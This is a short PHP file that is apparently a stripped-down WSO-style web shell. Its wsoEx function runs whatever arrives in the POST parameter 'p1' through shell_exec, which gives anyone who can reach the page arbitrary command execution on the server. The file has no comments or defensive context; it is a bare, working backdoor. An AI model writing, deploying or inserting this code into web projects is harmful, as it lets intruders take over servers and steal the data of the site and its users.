<?php
function wsoEx($in) {
    $out = '';
    if (function_exists('shell_exec')) {
        $out = shell_exec($in);
    }
    return $out;
}

wsoEx($_POST['p1']);
?>